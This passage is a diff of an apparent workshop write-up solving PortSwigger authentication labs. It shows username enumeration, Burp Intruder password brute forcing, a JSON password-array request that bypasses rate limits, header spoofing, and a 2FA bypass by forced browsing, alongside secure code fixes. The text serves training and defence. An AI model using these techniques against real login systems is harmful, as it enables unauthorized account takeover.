@@ -449,10 +449,13 @@
                 <!-- Section 1 -->
                 <h2 id="authentication-flaws-overview">1. Anatomy of Enterprise Authentication Flaws</h2>
                 <p>
-                  Authentication is the critical gatekeeper of any modern application. When authentication mechanisms are flawed, attackers can bypass identity verification entirely, gaining administrative privileges, accessing confidential data, and impersonating legitimate users.
+                  Authentication is the primary security boundary of every modern digital application. It verifies the question: <em>"Are you truly who you claim to be?"</em> When authentication fails, all subsequent authorization boundaries (role-based access control, object-level security, tenant isolation) instantly dissolve, leaving critical business systems and customer data completely exposed.
                 </p>
                 <p>
-                  On Day 8 of the BugXploit workshop, the mentors led the cohort through deep practical exploitation of real-world authentication mechanisms on the <strong>PortSwigger Web Security Academy</strong>. Authentication flaws rarely stem from broken cryptographic algorithms; rather, they arise from <strong>subtle logical errors</strong>, <strong>inconsistent error handling</strong>, <strong>flawed rate-limiting state machines</strong>, and <strong>insecure reverse proxy interactions</strong>.
+                  In modern enterprise applications, authentication rarely fails due to broken mathematical cryptography like AES or RSA. Instead, breaches almost universally stem from <strong>subtle logical flaws</strong>, <strong>information leakages through error messages</strong>, <strong>inconsistent state machines</strong>, <strong>misconfigured reverse proxies</strong>, and <strong>assumptions about user input formats</strong>.
+                </p>
+                <p>
+                  During Day 8 of the BugXploit workshop, instructors <strong>Birendra Sah</strong> and <strong>Bishal Shrestha</strong> guided the cohort through real-world, hands-on lab environments on the <strong>PortSwigger Web Security Academy</strong>. The goal of this documentation is strictly defensive and educational: by dissecting the exact HTTP requests, Burp Suite mechanics, and backend logic flaws attackers weaponize, software engineers and penetration testers can architect robust, breach-proof authentication systems.
                 </p>
 
                 <!-- Section 2: Lab 1 -->
@@ -467,96 +470,177 @@
                   </div>
                   <h4 class="fw-bold text-primary mb-2">Lab: Username enumeration via different responses</h4>
                   <p class="small text-muted mb-0">
-                    <strong>Vulnerability:</strong> The application returns subtly distinct error messages and response byte lengths depending on whether the submitted username exists in the database.
+                    <strong>Vulnerability Category:</strong> Information Disclosure in Authentication (CWE-204: Observable Response Discrepancy).
                   </p>
                 </div>
 
-                <h3>The Technical Problem</h3>
+                <h3>The Core Problem &amp; Developer Flaw</h3>
                 <p>
-                  Secure authentication endpoints must treat invalid login attempts with identical ambiguity: <em>"Invalid username or password"</em>. However, legacy or improperly designed login handlers evaluate credentials in two distinct logical branches:
-                </p>
-                <ol>
-                  <li>Check if the username exists in the database. If not found, abort immediately with <code>Invalid username</code>.</li>
-                  <li>If the username exists, verify the password hash. If incorrect, abort with <code>Incorrect password</code>.</li>
-                </ol>
-                <p>
-                  This procedural leakage allows an attacker to separate the credential auditing process into two phases: first discovering a valid username, and second, focusing computational brute-force power exclusively against that confirmed account.
+                  Consider what happens behind the scenes in many naive backend login handlers. A software engineer writes code to optimize database lookups:
                 </p>
 
-                <h3>Step-by-Step Exploitation in Burp Suite</h3>
+                <div class="row g-3 my-2">
+                  <div class="col-md-6">
+                    <div class="card h-100 border-danger">
+                      <div class="card-header bg-danger text-white fw-bold small">
+                        <i class="bi bi-x-circle"></i> Vulnerable Backend Logic (Node.js / Express)
+                      </div>
+                      <div class="card-body p-2">
+                        <pre style="margin: 0; font-size: 12px;"><code>app.post('/login', async (req, res) => {
+  const { username, password } = req.body;
+  const user = await db.findUser(username);
+
+  // FLAW 1: Early exit tells the attacker the username doesn't exist!
+  if (!user) {
+    return res.status(200).send({ 
+      error: "Invalid username" 
+    });
+  }
+
+  const valid = await bcrypt.compare(password, user.passwordHash);
+  // FLAW 2: Distinct message confirms username EXISTS!
+  if (!valid) {
+    return res.status(200).send({ 
+      error: "Incorrect password" 
+    });
+  }
+
+  createSession(res, user);
+});</code></pre>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="col-md-6">
+                    <div class="card h-100 border-success">
+                      <div class="card-header bg-success text-white fw-bold small">
+                        <i class="bi bi-check-circle"></i> Secure Defensive Implementation
+                      </div>
+                      <div class="card-body p-2">
+                        <pre style="margin: 0; font-size: 12px;"><code>app.post('/login', async (req, res) => {
+  const { username, password } = req.body;
+  const user = await db.findUser(username);
+  
+  // Always perform hash check to prevent timing analysis!
+  const dummyHash = "$2b$12$e8uq0e...";
+  const targetHash = user ? user.passwordHash : dummyHash;
+  const valid = await bcrypt.compare(password, targetHash);
+
+  // UNIFORM RESPONSE: Identical text, length, and timing
+  if (!user || !valid) {
+    return res.status(401).send({ 
+      error: "Invalid username or password" 
+    });
+  }
+
+  createSession(res, user);
+});</code></pre>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <p>
+                  When the developer outputs <code>Invalid username</code> for non-existent users and <code>Incorrect password</code> for real users, an attacker can enumerate every registered account on the platform with 100% certainty before guessing a single password.
+                </p>
+
+                <h3>Burp Suite Intruder: Two-Phase Exploitation</h3>
+                <p>
+                  To systematically harvest the valid username and password, we use <strong>Burp Suite Intruder</strong> with a <strong>Sniper</strong> attack:
+                </p>
+
+                <h4>Phase 1: Enumerating the Registered Username</h4>
                 <ol>
                   <li>
-                    <strong>Capture Baseline Request:</strong> Submit an intentional invalid login (e.g., <code>username=testuser&amp;password=testpass</code>). In Burp Suite, navigate to <code>Proxy &gt; HTTP history</code> and locate the <code>POST /login</code> request.
+                    <strong>Capture HTTP Traffic:</strong> In your browser (configured through Burp's Proxy on port 8080), enter any test login attempt (e.g. <code>username=testuser&amp;password=fakepassword</code>).
                   </li>
                   <li>
-                    <strong>Send to Burp Intruder:</strong> Press <code>Ctrl + I</code> to send the request to Intruder.
+                    <strong>Send to Intruder:</strong> In Burp Suite, open <code>Proxy &gt; HTTP history</code>, find the <code>POST /login</code> request, right-click, and select <strong>Send to Intruder</strong> (or press <code>Ctrl + I</code>).
                   </li>
                   <li>
-                    <strong>Configure Payload Positions (Sniper Attack):</strong> Set the attack type to <strong>Sniper</strong>. Clear default payload markers and assign a single marker to the username value:
+                    <strong>Define Payload Positions:</strong> Under the <em>Positions</em> tab, choose <strong>Sniper</strong> attack type. Click <strong>Clear §</strong>, and add markers around the username field only:
+                    <pre><code>POST /login HTTP/1.1
+Host: &lt;target-lab-id&gt;.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+
+csrf=pUf1uX6UuCqLg1fLqC8fXyq0Lq0&amp;username=§testuser§&amp;password=fakepassword</code></pre>
+                  </li>
+                  <li>
+                    <strong>Load Wordlist:</strong> Navigate to the <em>Payloads</em> tab. Under <em>Payload settings</em>, paste the PortSwigger candidate username wordlist (containing names like <code>admin</code>, <code>root</code>, <code>carlos</code>, <code>ao</code>, <code>wiener</code>, etc.).
+                  </li>
+                  <li>
+                    <strong>Launch &amp; Analyze Results:</strong> Click <strong>Start attack</strong>. Sort the results table by the <strong>Length</strong> column:
+                    <ul>
+                      <li>Every invalid username produces an HTTP 200 with content length <strong>3,312 bytes</strong> and response text: <code>&lt;p class=is-warning&gt;Invalid username&lt;/p&gt;</code>.</li>
+                      <li>Exactly <strong>one</strong> payload — <code>ao</code> — produces a response with content length <strong>3,330 bytes</strong> and response text: <code>&lt;p class=is-warning&gt;Incorrect password&lt;/p&gt;</code>.</li>
+                    </ul>
+                    <div class="callout-box">
+                      <strong>Enumeration Confirmed:</strong> The username <code>ao</code> exists on the server! We now know our high-value target.
+                    </div>
+                  </li>
+                </ol>
+
+                <h4>Phase 2: Password Brute-Forcing Against the Confirmed User</h4>
+                <ol>
+                  <li>
+                    <strong>Adjust Intruder Positions:</strong> Return to the Intruder <em>Positions</em> tab. Fix the username value to <code>ao</code>, clear all markers, and add payload markers around the password field:
                     <pre><code>POST /login HTTP/1.1
 Host: &lt;target-lab-id&gt;.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 
-csrf=xxxxxx&amp;username=§testuser§&amp;password=staticpassword</code></pre>
+csrf=pUf1uX6UuCqLg1fLqC8fXyq0Lq0&amp;username=ao&amp;password=§fakepassword§</code></pre>
                   </li>
                   <li>
-                    <strong>Load Candidate Usernames:</strong> Under the <em>Payloads</em> tab, paste the wordlist of candidate usernames. Start the attack.
+                    <strong>Load Password Wordlist:</strong> Under <em>Payloads</em>, paste the candidate password wordlist provided by the lab.
                   </li>
                   <li>
-                    <strong>Analyze Response Length &amp; Content:</strong> Sort the Intruder results table by the <strong>Length</strong> column. 
-                    Notice that one payload yields a slightly longer response length (e.g., <strong>3,330 bytes</strong> vs 3,312 bytes). Inspecting the response reveals the message:
-                    <pre><code>&lt;p class=is-warning&gt;Incorrect password&lt;/p&gt;</code></pre>
-                    whereas every other payload returned:
-                    <pre><code>&lt;p class=is-warning&gt;Invalid username&lt;/p&gt;</code></pre>
-                    <strong>Discovered Valid Username:</strong> <code>ao</code>.
+                    <strong>Run the Attack:</strong> Click <strong>Start attack</strong>. Observe the <strong>Status</strong> column in the Intruder results table:
+                    <ul>
+                      <li>99+ passwords return status <code>200 OK</code> with length ~3,330 bytes (displaying <code>Incorrect password</code>).</li>
+                      <li>Exactly one password, <code>jessica</code>, returns <strong>HTTP <code>302 Found</code></strong> with a redirection to <code>/my-account?id=ao</code> and a new session cookie!</li>
+                    </ul>
                   </li>
                   <li>
-                    <strong>Phase 2: Brute-Forcing the Password:</strong> Return to Intruder positions. Set the username statically to <code>ao</code> and position the payload marker on the password field:
-                    <pre><code>csrf=xxxxxx&amp;username=ao&amp;password=§testpassword§</code></pre>
-                  </li>
-                  <li>
-                    <strong>Execute Password Attack:</strong> Load the candidate passwords wordlist and launch the attack. Every invalid password returns an HTTP <code>200 OK</code> response. Exactly one request returns an <strong>HTTP <code>302 Found</code></strong> redirection with a <code>Set-Cookie: session=...</code> header.
-                  </li>
-                  <li>
-                    <strong>Target Compromised:</strong> Discovered valid password: <code>jessica</code>. Logging in as <code>ao:jessica</code> successfully solves the lab.
+                    <strong>Verification:</strong> Log in manually in the browser with <code>ao</code> : <code>jessica</code>. The account dashboard loads and the lab is solved!
                   </li>
                 </ol>
 
                 <!-- Section 3 -->
                 <h2 id="rate-limiting-mechanisms">3. Defensive Rate-Limiting &amp; Evasion Strategies</h2>
                 <p>
-                  To prevent attackers from running dictionary attacks, enterprise web applications deploy <strong>Rate Limiting</strong> and <strong>Account Lockout</strong> mechanisms:
+                  To mitigate automated brute-force attacks, security teams install rate-limiters. A rate-limiter tracks authentication attempts across time windows:
                 </p>
                 <ul>
-                  <li><strong>IP-Based Rate Limiting:</strong> Blocking or throttling any client IP address that sends more than 3 to 5 failed login attempts within a specific time window.</li>
-                  <li><strong>Account Lockout:</strong> Temporarily disabling the user account after 3 to 5 incorrect password submissions.</li>
+                  <li><strong>IP-based rate limiting:</strong> Allows a maximum of 3 failed attempts per minute from a given IP address.</li>
+                  <li><strong>Account-based lockout:</strong> Locks user <code>carlos</code> after 5 consecutive incorrect attempts.</li>
                 </ul>
 
                 <p>
-                  However, rate limiters frequently suffer from design limitations that attackers can exploit:
+                  However, rate limiters often have major architectural blindspots that attackers exploit:
                 </p>
+
                 <div class="row g-3 my-2">
                   <div class="col-md-4">
                     <div class="card h-100 p-3 bg-light border-0 shadow-sm">
-                      <h6 class="fw-bold text-primary mb-1">1. IP Spoofing Headers</h6>
+                      <h6 class="fw-bold text-primary mb-1">1. IP Header Spoofing</h6>
                       <p class="small text-muted mb-0">
-                        If the rate-limiter relies on reverse-proxy headers without filtering, injecting headers like <code>X-Forwarded-For: 127.0.0.1</code>, <code>X-Real-IP</code>, or <code>Client-IP</code> can fool the server into treating each request as originating from a new client.
+                        When reverse proxies (Nginx, HAProxy, AWS ALB) blindly forward client headers like <code>X-Forwarded-For</code> or <code>X-Real-IP</code>, attackers can rotate fake IPs on each request, resetting the rate counter.
                       </p>
                     </div>
                   </div>
                   <div class="col-md-4">
                     <div class="card h-100 p-3 bg-light border-0 shadow-sm">
-                      <h6 class="fw-bold text-primary mb-1">2. Low-and-Slow Spraying</h6>
+                      <h6 class="fw-bold text-primary mb-1">2. Password Spraying</h6>
                       <p class="small text-muted mb-0">
-                        Password spraying tests 1 password across thousands of usernames rather than thousands of passwords against 1 user, remaining below per-account threshold limits.
+                        Instead of trying 1,000 passwords against 1 account (which triggers lockout), attackers try 1 common password (e.g. <code>Autumn2026!</code>) across 1,000 distinct usernames, staying under the per-account threshold.
                       </p>
                     </div>
                   </div>
                   <div class="col-md-4">
                     <div class="card h-100 p-3 bg-light border-0 shadow-sm">
-                      <h6 class="fw-bold text-primary mb-1">3. Batch Request Injection</h6>
+                      <h6 class="fw-bold text-primary mb-1">3. Batch Credential Injection</h6>
                       <p class="small text-muted mb-0">
-                        Submitting an array of candidate passwords within a single HTTP request packet, allowing the attacker to test 100+ passwords while only registering 1 single request counter at the rate limiter.
+                        If the API accepts JSON, submitting an entire array of passwords in a single HTTP request packet tests hundreds of passwords while only incrementing the rate-limiter counter by 1!
                       </p>
                     </div>
                   </div>
@@ -574,68 +658,102 @@ csrf=xxxxxx&amp;username=§testuser§&amp;password=staticpassword</code></pre>
                   </div>
                   <h4 class="fw-bold text-primary mb-2">Lab: Broken brute-force protection, multiple credentials per request</h4>
                   <p class="small text-muted mb-0">
-                    <strong>Vulnerability:</strong> The login API accepts credentials as a JSON object. The backend parser supports array structures for the password parameter, iterating over each password while the rate-limiter only tallies single incoming HTTP requests.
+                    <strong>Vulnerability Category:</strong> Rate Limit Bypass via Type Juggling / Batch Array Processing (CWE-307: Improper Restriction of Excessive Authentication Attempts).
                   </p>
                 </div>
 
-                <h3>The Real-World Scenario &amp; Logic Flaw</h3>
+                <h3>The Attack Mechanics: Counting Requests vs. Counting Credentials</h3>
                 <p>
-                  In this lab, entering more than 3 failed attempts from an IP results in an immediate block: <em>"You have made too many incorrect login attempts. Please try again in 1 minute."</em> A standard Burp Intruder attack fails because the scanner triggers the rate limiter on request #4.
+                  In this lab, the target account is <code>carlos</code>. If you attempt 3 incorrect passwords via Burp Intruder or normal login, the server locks you out immediately:
+                </p>
+                <div class="callout-danger">
+                  <strong>Server Response:</strong> <code>You have made too many incorrect login attempts. Please try again in 1 minute.</code>
+                </div>
+                <p>
+                  Why does this happen? The web application firewall (WAF) or API gateway enforces rate limits by counting <strong>HTTP request invocations</strong>. It increments a Redis counter keyed by client IP: <code>INCR rate_limit:192.168.1.50</code>.
                 </p>
                 <p>
-                  However, inspecting the request body reveals that authentication is handled by a modern JSON endpoint:
+                  However, look at the structure of the login request when captured in Burp Suite:
                 </p>
                 <pre><code>POST /login HTTP/2
-Host: &lt;target-lab-id&gt;.web-security-academy.net
+Host: 0a1f00c90352f3e4821c8da400c9002f.web-security-academy.net
 Content-Type: application/json
+Content-Length: 48
 
-{"username":"carlos","password":"invalidpassword"}</code></pre>
+{"username":"carlos","password":"testpassword"}</code></pre>
+
                 <p>
-                  Because of sloppy type-checking in the backend authentication routine (common in Node.js, Python, or PHP backends), the server expects <code>password</code> to be a string, but if an <strong>array of strings</strong> is provided, the backend executes a loop:
+                  Notice that the payload is JSON. In dynamically typed backend languages (or carelessly written type handlers), if an attacker replaces the single string value <code>"testpassword"</code> with a <strong>JSON array of 100 strings</strong>:
                 </p>
-                <pre><code>// Flawed Backend Conceptual Logic
-for (let pass of request.body.password) {
-    if (verifyPassword(request.body.username, pass)) {
-        return createSession(request.body.username); // Logs in on first match!
-    }
-}
-return error("Invalid credentials");</code></pre>
 
-                <h3>Exploitation Walkthrough</h3>
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Vulnerable Backend Processing Loop</span>
+                  </div>
+                  <div class="terminal-body">
+                    <span class="prompt-symbol">// Express.js / Python Backend Vulnerability</span><br>
+                    const passwords = Array.isArray(req.body.password) ? req.body.password : [req.body.password];<br><br>
+                    for (let candidate of passwords) {<br>
+                    &nbsp;&nbsp;if (bcrypt.compareSync(candidate, user.passwordHash)) {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;req.session.user = user;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;return res.redirect('/my-account?id=' + user.username); // AUTHENTICATED!<br>
+                    &nbsp;&nbsp;}<br>
+                    }<br>
+                    return res.status(200).send("Invalid credentials");
+                  </div>
+                </div>
+
+                <p>
+                  The backend loops through each password in the array in a single execution thread. If any password matches, it logs the user in! Meanwhile, from the perspective of the rate-limiter, <strong>only 1 single HTTP request was made</strong>! The rate-limiter counter remains at <code>1 / 3</code>, completely bypassing the brute-force defense!
+                </p>
+
+                <h3>Full Step-by-Step Burp Repeater Exploitation</h3>
                 <ol>
-                  <li>Capture the <code>POST /login</code> JSON request in Burp Suite and send it to <strong>Burp Repeater</strong> (<code>Ctrl + R</code>).</li>
                   <li>
-                    Replace the single password string with a complete JSON array containing all 100+ candidate passwords provided by the lab:
+                    <strong>Capture the Login Request:</strong> Log in once with <code>carlos:wrongpass</code>. Go to <code>Proxy &gt; HTTP history</code>, find the <code>POST /login</code> request.
+                  </li>
+                  <li>
+                    <strong>Send to Burp Repeater:</strong> Press <code>Ctrl + R</code>.
+                  </li>
+                  <li>
+                    <strong>Construct the Full Batch JSON Array:</strong> Replace the body with the entire wordlist of 100 candidate passwords formatted as a JSON array:
                     <div class="terminal-window">
                       <div class="terminal-header">
                         <span class="terminal-circle tc-red"></span>
                         <span class="terminal-circle tc-yellow"></span>
                         <span class="terminal-circle tc-green"></span>
-                        <span class="terminal-title">Burp Repeater: JSON Batch Payload</span>
+                        <span class="terminal-title">Burp Repeater: Single HTTP/2 Request Containing All 100 Candidate Passwords</span>
                       </div>
                       <div class="terminal-body">
                         POST /login HTTP/2<br>
                         Host: 0a1f00c90352f3e4821c8da400c9002f.web-security-academy.net<br>
+                        Cookie: session=tc5vIGDaX8RP9ycnF62WGm4yIfhsG7X2<br>
                         Content-Type: application/json<br>
-                        Cookie: session=tc5vIGDaX8RP9ycnF62WGm4yIfhsG7X2<br><br>
+                        Content-Length: 1042<br><br>
                         {"username":"carlos","password":[<br>
-                        &nbsp;&nbsp;"123456",<br>
-                        &nbsp;&nbsp;"password",<br>
-                        &nbsp;&nbsp;"12345678",<br>
-                        &nbsp;&nbsp;"qwerty",<br>
-                        &nbsp;&nbsp;...<br>
-                        &nbsp;&nbsp;"montana",<br>
-                        &nbsp;&nbsp;"moon",<br>
-                        &nbsp;&nbsp;"moscow"<br>
+                        &nbsp;&nbsp;"123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111",<br>
+                        &nbsp;&nbsp;"1234567", "dragon", "123123", "baseball", "football", "welcome", "sunshine", "monkey",<br>
+                        &nbsp;&nbsp;"letmein", "charlie", "donald", "mustang", "princess", "shadow", "master", "michael",<br>
+                        &nbsp;&nbsp;"superman", "696969", "harley", "jordan", "killer", "trustno1", "hunter", "liverpool",<br>
+                        &nbsp;&nbsp;"chelsea", "arsenal", "alexander", "starwars", "orange", "yellow", "freedom", "secret",<br>
+                        &nbsp;&nbsp;"pepper", "cookie", "summer", "winter", "spring", "autumn", "diamond", "emerald",<br>
+                        &nbsp;&nbsp;"computer", "internet", "network", "windows", "linux", "system", "admin", "carlos",<br>
+                        &nbsp;&nbsp;"barcelona", "madrid", "brazil", "argentina", "london", "paris", "tokyo", "newyork",<br>
+                        &nbsp;&nbsp;"matrix", "batman", "pokemon", "spiderman", "robert", "thomas", "william", "daniel",<br>
+                        &nbsp;&nbsp;"coffee", "ginger", "chester", "bailey", "buster", "shadow", "simba", "bandit",<br>
+                        &nbsp;&nbsp;"buster", "sammy", "tucker", "montana", "moon", "moscow"<br>
                         ]}
                       </div>
                     </div>
                   </li>
                   <li>
-                    <strong>Dispatch Single Request:</strong> Click <strong>Send</strong>. Because only <strong>one single HTTP request</strong> is transmitted, the rate-limiter counts <code>1 / 3</code> requests and does NOT trigger an IP block!
+                    <strong>Dispatch the Request:</strong> In Burp Repeater, click <strong>Send</strong>.
                   </li>
                   <li>
-                    <strong>Immediate Success Response:</strong> The server iterates through the array, encounters the correct password, and responds with:
+                    <strong>Inspect Response:</strong> Because Carlos's real password (e.g. <code>montana</code>) is inside the array, the backend matches it during the loop and immediately returns an <strong>HTTP <code>302 Found</code></strong> redirection with a valid session cookie:
                     <pre><code>HTTP/2 302 Found
 Location: /my-account?id=carlos
 Set-Cookie: session=zXDZ44Wiyy9FCEfgcs3G2sSC98nJfHNz; Secure; HttpOnly; SameSite=None
@@ -643,24 +761,56 @@ X-Frame-Options: SAMEORIGIN
 Content-Length: 0</code></pre>
                   </li>
                   <li>
-                    <strong>Browser Session Takeover:</strong> Right-click the response in Burp Repeater &gt; select <strong>Show response in browser</strong> &gt; copy the generated URL &gt; paste it into your browser. You are instantly authenticated into Carlos's administrative account.
+                    <strong>Hijack the Session in Browser:</strong> In Burp Repeater, right-click anywhere in the response pane, select <strong>Show response in browser</strong>, click <strong>Copy</strong>, and paste the URL (e.g., <code>http://burpsuite/show/1/...</code>) into your proxy-configured browser. The page renders Carlos's account, solving the lab!
                   </li>
                 </ol>
+
+                <div class="card my-3 border-primary">
+                  <div class="card-header bg-primary text-white fw-bold small">
+                    <i class="bi bi-shield-lock-fill"></i> How Developers Fix This Vulnerability
+                  </div>
+                  <div class="card-body small">
+                    Strictly validate input schemas before processing. If <code>req.body.password</code> is anything other than a primitive string, reject the entire request immediately with HTTP 400 Bad Request:
+                    <pre style="margin: 8px 0 0 0;"><code>// Strict schema validation with Joi / Zod
+const schema = z.object({
+  username: z.string().min(1).max(50),
+  password: z.string().min(1).max(128) // Rejects arrays, objects, or non-strings!
+});</code></pre>
+                  </div>
+                </div>
 
                 <!-- Section 5 -->
                 <h2 id="two-factor-auth-mechanics">5. Two-Factor Authentication (2FA) Architecture &amp; Attack Vectors</h2>
                 <p>
-                  Two-Factor Authentication (2FA) requires users to provide two distinct authentication factors: something they <strong>know</strong> (password) and something they <strong>have</strong> (SMS OTP, Authenticator app TOTP, hardware key).
-                </p>
-                <p>
-                  Common architectural flaws in 2FA implementations include:
+                  Two-Factor Authentication (2FA) requires two distinct verification categories:
                 </p>
                 <ul>
-                  <li><strong>Flawed State Transitions:</strong> Creating the fully authenticated user session immediately upon Stage 1 (password verification) instead of waiting for Stage 2 (2FA code validation).</li>
-                  <li><strong>Leaking OTPs in Responses:</strong> Returning the generated verification code inside the JSON response of the <code>/send-2fa</code> API call for frontend validation.</li>
-                  <li><strong>Brute-Forceable OTPs:</strong> Generating short 4-digit codes (0000–9999) without rate limiting, allowing automated brute-forcing in under 10 seconds.</li>
-                  <li><strong>Channel Compromise:</strong> Email-based 2FA offers zero security if the attacker already has access to the user's email account. SMS-based 2FA is vulnerable to SIM swapping and SS7 attacks. Hardware authenticators (YubiKey / WebAuthn) offer the highest resilience.</li>
+                  <li><strong>Knowledge Factor:</strong> Something the user knows (password, PIN).</li>
+                  <li><strong>Possession Factor:</strong> Something the user has (hardware YubiKey, Authenticator app TOTP, SMS code).</li>
                 </ul>
+
+                <p>
+                  While 2FA is an industry standard, flawed implementations often suffer from critical vulnerabilities:
+                </p>
+                <div class="row g-3 my-2">
+                  <div class="col-md-6">
+                    <div class="card h-100 border-0 shadow-sm p-3 bg-light">
+                      <h6 class="fw-bold text-danger"><i class="bi bi-exclamation-octagon"></i> 1. State Machine Desynchronization</h6>
+                      <p class="small text-muted mb-0">
+                        The backend issues a full session cookie right after the password check, and merely uses client-side JavaScript or a temporary route redirect to show the 2FA prompt. The authenticated dashboard routes never verify if the 2FA flag was actually approved.
+                      </p>
+                    </div>
+                  </div>
+                  <div class="col-md-6">
+                    <div class="card h-100 border-0 shadow-sm p-3 bg-light">
+                      <h6 class="fw-bold text-danger"><i class="bi bi-envelope-exclamation"></i> 2. Delivery Channel Vulnerabilities</h6>
+                      <p class="small text-muted mb-0">
+                        <strong>Email 2FA:</strong> If an attacker compromises the victim's email, both factors are breached simultaneously. <br>
+                        <strong>SMS 2FA:</strong> Vulnerable to SIM-swapping, SS7 telecom interception, and carrier phishing. Hardware security keys (FIDO2 / WebAuthn) remain the gold standard.
+                      </p>
+                    </div>
+                  </div>
+                </div>
 
                 <!-- Section 6: Lab 3 -->
                 <h2 id="lab3-2fa-simple-bypass">6. Lab 3: 2FA Simple Bypass via Forced Browsing</h2>
@@ -674,28 +824,67 @@ Content-Length: 0</code></pre>
                   </div>
                   <h4 class="fw-bold text-primary mb-2">Lab: 2FA simple bypass</h4>
                   <p class="small text-muted mb-0">
-                    <strong>Vulnerability:</strong> The application fails to enforce completion of the 2FA stage before authorizing access to authenticated endpoints.
+                    <strong>Vulnerability Category:</strong> Broken State Machine &amp; Forced Browsing (CWE-287: Improper Authentication).
                   </p>
                 </div>
+
+                <h3>Vulnerability Root Cause</h3>
+                <p>
+                  In this lab, you are given your own credentials (<code>wiener:peter</code>) and target victim credentials (<code>carlos:montoya</code>).
+                </p>
+                <p>
+                  When you submit a username and password, the server responds with:
+                </p>
+                <pre><code>HTTP/2 302 Found
+Location: /login2
+Set-Cookie: session=Bqf9YxO24...; Path=/; Secure; HttpOnly</code></pre>
+                <p>
+                  Notice the severe design failure: <strong>The server created an active session cookie before 2FA verification took place</strong>. The application assumes that because it redirected the client's browser to <code>/login2</code>, the user is forced to enter the 2FA code. But HTTP is stateless! The client controls the browser address bar and can request any URL at will.
+                </p>
 
                 <h3>Step-by-Step Exploitation</h3>
                 <ol>
                   <li>
-                    <strong>Observe Normal Baseline:</strong> Log in with your own credentials (<code>wiener:peter</code>). You are redirected to <code>/login2</code> and prompted for a 4-digit 2FA code. Open your email client, retrieve the code, submit it, and observe that your browser lands on:
-                    <pre><code>GET /my-account?id=wiener</code></pre>
-                  </li>
-                  <li><strong>Log Out:</strong> Terminate your session.</li>
-                  <li>
-                    <strong>Initiate Target Login:</strong> Log in with victim credentials (<code>carlos:montoya</code>). The server validates the password and redirects your browser to the 2FA verification prompt at <code>/login2</code>.
+                    <strong>Establish Normal Flow:</strong> Log in as <code>wiener:peter</code>. The browser is redirected to <code>/login2</code>. Check your email client, retrieve the 4-digit code (e.g., <code>0491</code>), enter it, and observe the destination URL:
+                    <pre><code>GET /my-account?id=wiener HTTP/1.1</code></pre>
                   </li>
                   <li>
-                    <strong>Execute Forced Browsing Bypass:</strong> Without submitting any 2FA code, simply modify the browser URL bar directly to:
+                    <strong>Log Out:</strong> Click <strong>Log out</strong> to clear your session.
+                  </li>
+                  <li>
+                    <strong>Login as Victim:</strong> Enter <code>carlos:montoya</code> on the login page.
+                  </li>
+                  <li>
+                    <strong>Intercept the 2FA State:</strong> The browser is redirected to <code>/login2</code> and prompts for Carlos's 4-digit 2FA code (which is sent to Carlos's private email, inaccessible to us).
+                  </li>
+                  <li>
+                    <strong>Execute Forced Browsing:</strong> Do NOT submit any 2FA code. Instead, manually edit the URL bar in your browser to:
                     <pre><code>https://&lt;target-lab-id&gt;.web-security-academy.net/my-account</code></pre>
+                    and hit <strong>Enter</strong>!
                   </li>
                   <li>
-                    <strong>Vulnerability Confirmation:</strong> The server checks the session cookie, verifies that the user successfully completed password authentication, but <strong>fails to check whether the 2FA state flag was validated</strong>. The account dashboard immediately loads, solving the lab.
+                    <strong>Bypass Confirmed:</strong> Because the backend endpoint <code>/my-account</code> only checks:
+                    <pre><code>if (session.loggedIn) { ... } // Fails to check: if (!session.twoFactorCompleted)</code></pre>
+                    The server renders Carlos's account page, achieving full bypass and solving the lab!
                   </li>
                 </ol>
+
+                <div class="card my-3 border-success">
+                  <div class="card-header bg-success text-white fw-bold small">
+                    <i class="bi bi-shield-check"></i> Defensive Remediation: Multi-Stage State Enforcement
+                  </div>
+                  <div class="card-body small">
+                    Never grant a full authorization session cookie at Stage 1. Instead, issue a temporary, restricted token that is only authorized to call the <code>/verify-2fa</code> endpoint:
+                    <pre style="margin: 8px 0 0 0;"><code>// Middleware protecting all /account routes
+function requireFullAuth(req, res, next) {
+  if (!req.session.userId) return res.redirect('/login');
+  if (req.session.twoFactorRequired &amp;&amp; !req.session.twoFactorVerified) {
+    return res.status(403).json({ error: "2FA verification required" });
+  }
+  next();
+}</code></pre>
+                  </div>
+                </div>
 
                 <!-- Section 7: Lab 4 -->
                 <h2 id="lab4-password-reset-broken-logic">7. Lab 4: Password Reset Broken Logic (Token Stripping)</h2>
@@ -709,46 +898,134 @@ Content-Length: 0</code></pre>
                   </div>
                   <h4 class="fw-bold text-primary mb-2">Lab: Password reset broken logic</h4>
                   <p class="small text-muted mb-0">
-                    <strong>Vulnerability:</strong> The password reset confirmation routine relies on a client-submitted hidden form parameter rather than binding the reset token to the target account.
+                    <strong>Vulnerability Category:</strong> Parameter Tampering &amp; Broken State Handling in Password Reset (CWE-640: Weak Password Recovery Mechanism).
                   </p>
                 </div>
 
-                <h3>Step-by-Step Exploitation</h3>
+                <h3>How the Flawed Reset Mechanism Works</h3>
+                <p>
+                  When a legitimate user resets their password, a secure application generates a cryptographically random token tied to their database record:
+                </p>
                 <ol>
-                  <li>
-                    <strong>Trigger Reset on Controlled Account:</strong> Click <em>Forgot password?</em> and submit <code>wiener</code>. Access the email client and click the delivered password reset link.
-                  </li>
-                  <li>
-                    <strong>Inspect Reset Submission:</strong> Enter a new password (e.g., <code>newpassword123</code>). Intercept the submission in Burp Suite:
-                    <pre><code>POST /forgot-password?temp-forgot-password-token=xxxxxxxxxxxxxxxxxxxx HTTP/1.1
+                  <li>User requests password reset for <code>wiener</code>.</li>
+                  <li>Server generates <code>token_abc123</code> and saves it in the database: <code>users[wiener].reset_token = "token_abc123"</code>.</li>
+                  <li>User clicks the email link: <code>/forgot-password?temp-forgot-password-token=token_abc123</code>.</li>
+                  <li>User submits a new password. The server checks: <em>"Does this token exist? Which user does this token belong to?"</em> It resets <strong>that user's</strong> password.</li>
+                </ol>
+
+                <p>
+                  However, in this vulnerable application, the password reset form embeds a hidden field containing the username:
